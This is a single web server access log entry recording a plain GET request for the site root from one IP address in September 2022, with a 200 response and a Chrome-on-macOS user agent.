209.141.49.169 - - [12/Sep/2022:06:37:59 +0000] "GET / HTTP/1.1" 200 997 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
